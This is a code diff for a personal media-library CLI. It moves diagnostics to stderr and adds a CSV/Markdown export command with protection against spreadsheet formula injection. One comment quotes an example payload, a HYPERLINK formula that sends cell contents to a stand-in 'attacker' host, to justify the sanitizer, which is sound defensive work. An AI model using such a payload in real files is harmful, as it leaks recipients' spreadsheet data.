@@ -1,3 +1,4 @@
+import csv
 import re
 import subprocess
 import typer
@@ -23,6 +24,10 @@ from cli.doctor import doctor
 from cli.config import BASE_URL, API_PORT
 
 console = Console()
+# Diagnostics that must NOT land in a redirect. `bunker export … > coleccion.csv` sends stdout to
+# the file, and `console` is bound to stdout: measured with the server down, the CSV came out
+# holding "Error de red: [Errno 111] Connection refused" and the terminal came out empty.
+console_err = Console(stderr=True)
 app = typer.Typer(
     help="CLI tool to manage my personal library.", no_args_is_help=True)
 
@@ -46,34 +51,39 @@ def ensure_infrastructure_up():
         _infrastructure_checked = True  # Sellamos la verificación exitosa
 
     except (httpx.ConnectError, httpx.ReadError, httpx.RemoteProtocolError, httpx.TimeoutException):
-        console.print(
+        # ALL OF THIS GOES TO STDERR, and it is not cosmetic. This runs from `@app.callback()`
+        # before EVERY command, so on stdout it lands inside any redirect: measured with the
+        # server down, `bunker export libros -f csv > libros.csv` put "Infraestructura dormida",
+        # the progress dots and "El servidor tardo demasiado" INTO THE CSV, and left the terminal
+        # empty. Progress is a diagnostic; only the command's data belongs on stdout.
+        console_err.print(
             "\n[bold yellow]Infraestructura dormida o inestable. Encendiendo servidores...[/bold yellow]")
         project_dir = Path(__file__).resolve().parent.parent
         try:
             subprocess.run(["docker", "compose", "up", "-d"], cwd=project_dir,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except FileNotFoundError:
-            console.print(
+            console_err.print(
                 "[bold red]Comando 'docker compose' no encontrado en el sistema.[/bold red]")
             return
 
-        console.print(
+        console_err.print(
             "[cyan]Sincronizando bases de datos distribuidas[/cyan]", end="")
         for _ in range(20):
             try:
                 sede.get(
                     f"{BASE_URL}/api/health/", timeout=2.0)
-                console.print(
+                console_err.print(
                     "\n[bold green]¡Sistemas en línea![/bold green]\n")
                 _infrastructure_checked = True  # Sellamos la verificación tras encender
                 return
 
             except (httpx.ConnectError, httpx.ReadError, httpx.RemoteProtocolError, httpx.TimeoutException):
-                console.print(".", end="", style="cyan")
-                sys.stdout.flush()
+                console_err.print(".", end="", style="cyan")
+                sys.stderr.flush()
                 time.sleep(1)
 
-        console.print(
+        console_err.print(
             "\n[bold red]El servidor tardó demasiado en responder.[/bold red]")
 
         _infrastructure_checked = True
@@ -380,6 +390,110 @@ def enter_bunker():
     ensure_infrastructure_up()
     app_tui = BunkerApp()
     app_tui.run()
+
+
+# --- EXPORT ONE COLLECTION ---
+#
+# Until 2026-09-02 the only thing that left the Bunker was the whole JSON dump, which is for
+# restoring and not for SHOWING somebody what you own. This writes to standard output so the
+# shell picks the destination (`> coleccion.csv`, `| less`, `| pbcopy`): a `--salida` flag would
+# be reimplementing redirection.
+#
+# The columns are a CHOSEN SUBSET, not `fields = '__all__'`: `cover_url`, `description`,
+# `tracklist` and `review_notes` are not for sharing, and a 20-column table does not read.
+#
+# (label: (API path, [(header, field)...]))
+_COLECCIONES = {
+    "libros": (f"{BASE_URL}/api/books/library/", [
+        ("Titulo", "title"), ("Autor", "author_name"), ("Editorial", "publisher"),
+        ("Formato", "format_type"), ("Paginas", "page_count"), ("Generos", "genre_list"),
+        ("Leido", "is_read"), ("Nota", "personal_rating")]),
+    "cine": (f"{BASE_URL}/api/movies/inventory/", [
+        ("Titulo", "title"), ("Director", "director"), ("Anio", "release_year"),
+        ("Minutos", "duration_minutes"), ("Formato", "format_type"), ("Generos", "genres"),
+        ("Visto", "is_watched"), ("Nota", "personal_rating")]),
+    "musica": (f"{BASE_URL}/api/music/albums/", [
+        ("Titulo", "title"), ("Artista", "artist"), ("Sello", "label"),
+        ("Anio", "release_year"), ("Formato", "format_type"), ("Generos", "genres"),
+        ("Escuchado", "is_listened"), ("Nota", "personal_rating")]),
+}
+
+
+# A cell starting with one of these is a FORMULA to Excel, LibreOffice and Sheets — quoting it
+# for the CSV parser does not stop that, and this command exists to hand the file to somebody
+# else. The titles are third-party text: they arrive from the barcode oracles (Google Books, TMDB,
+# Discogs) and from scraped listings, so `=HYPERLINK("http://attacker/"&A1,"Ver")` as a title is
+# a listing away. Measured before the fix: it reached the file untouched.
+_PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _sin_formula(celda: str) -> str:
+    """Prefixes a leading formula character with a quote. CSV only.
+
+    Not applied to Markdown on purpose: nothing evaluates a Markdown table, and the quote would
+    show up as a visible character in the rendered document.
+    """
+    return "'" + celda if celda.startswith(_PELIGROSOS) else celda
+
+
+def _celda(valor) -> str:
+    """One API field as printable text.
+
+    Genres arrive as a list — of strings for music, and books' `genre_list` can carry dicts —
+    booleans as True/False, and optionals as None. A bare `str(valor)` would write "None" and
+    "['House', 'Techno']" into the cell.
+    """
+    if valor is None:
+        return ""
+    if isinstance(valor, bool):
+        return "si" if valor else "no"
+    if isinstance(valor, (list, tuple)):
+        return "; ".join(_celda(v) for v in valor)
+    if isinstance(valor, dict):
+        return str(valor.get("name") or valor.get("nombre") or valor)
+    return str(valor)
+
+
+@app.command(name="export")
+def export_collection(
+    coleccion: str = typer.Argument(..., help="libros | cine | musica"),
+    formato: str = typer.Option("csv", "--formato", "-f", help="csv | md"),
+):
+    """Exporta una colección a CSV o Markdown por la salida estándar."""
+    if coleccion not in _COLECCIONES:
+        console_err.print(f"[bold red]Colección desconocida: {coleccion}[/bold red] "
+                          f"(hay {', '.join(sorted(_COLECCIONES))})")
+        raise typer.Exit(code=1)
+    if formato not in ("csv", "md"):
+        console_err.print(f"[bold red]Formato desconocido: {formato}[/bold red] (csv | md)")
+        raise typer.Exit(code=1)
+
+    url, columnas = _COLECCIONES[coleccion]
+    try:
+        resp = sede.get(url, timeout=15.0)
+        resp.raise_for_status()
+        filas = resp.json()
+    except Exception as e:
+        console_err.print(f"[bold red]Error de red: {e}[/bold red]")
+        raise typer.Exit(code=1)
+
+    cabeceras = [c for c, _ in columnas]
+    tabla = [[_celda(fila.get(campo)) for _, campo in columnas] for fila in filas]
+
+    # `print` and not `console.print`: Rich reads a title's square brackets as markup and eats
+    # them. `[Deluxe Edition]` would come out empty, and an export that silently loses part of a
+    # title is worse than one that does not exist.
+    if formato == "csv":
+        escritor = csv.writer(sys.stdout)
+        escritor.writerow(cabeceras)
+        escritor.writerows([[_sin_formula(c) for c in fila] for fila in tabla])
+    else:
+        # A `|` inside a cell splits the column in Markdown. Escaping it is one line.
+        esc = lambda t: t.replace("|", "\\|")
+        print("| " + " | ".join(cabeceras) + " |")
+        print("|" + "|".join("---" for _ in cabeceras) + "|")
+        for fila in tabla:
+            print("| " + " | ".join(esc(c) for c in fila) + " |")
 
 
 if __name__ == "__main__":
